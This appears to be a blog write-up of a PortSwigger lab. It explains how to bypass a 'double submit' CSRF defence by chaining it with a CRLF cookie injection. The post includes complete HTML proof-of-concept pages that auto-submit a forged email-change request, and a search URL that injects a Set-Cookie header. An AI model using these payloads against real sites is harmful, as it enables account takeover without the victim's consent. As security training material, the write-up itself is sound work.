---
layout: post
title:  "CSRF where token is duplicated in cookie"
date:   2024-10-02 09:39:54 +0530
---

## Objective 

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter` 

## Solution 

Once after login using the credentials `wiener:peter` provided in the lab objective and now I've updated the email.. Intercepted the request and looking into the request.. we have CSRF token in two places.. One in the header under cookies and another one in the POST body as a parameter 

![]({{ site.baseurl }}/assets/images/csrf-13.png) 

I've updated one of the csrf token kinda just changed the last value on `csrf` inside the `Cookie:` and as a response says that `CSRF token is invalid`

![]({{ site.baseurl }}/assets/images/CSRF-14.png)

Found that when we both values of the CSRF token are same and then request passes through 

![]({{ site.baseurl }}/assets/images/csrf-15.png) 

Let's generate the CSRF POC and keep that aside.. because we have a way to manipulate the body params `csrf` value.. But we need to find a way to inject the values of csrf inside the Cookie

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa900f504b8b225811be8b8001400c9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="same" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

We have identified a crlf vulnerability in the home page search functionality and may able to inject the custom values for `csrf` inside `Cookie`

![]({{ site.baseurl }}/assets/images/csrf-16.png) 

Let's make the search request as an `<img src>` and replace it with `<script>` in the previously generated POC 

```html
<img src="https://0a1400b804fc91fb805c6c99001600a3.web-security-academy.net/?search=nithisshtest%0d%0aSet-Cookie:%20csrf=same%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

Here is how the complete payload looks like 

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1400b804fc91fb805c6c99001600a3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="same" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1400b804fc91fb805c6c99001600a3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=same%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

This Should solve the lab but the portswigger didn't mark it as solved.. but after a decade, It marked as solved 

![]({{ site.baseurl }}/assets/images/csrf-17.png) 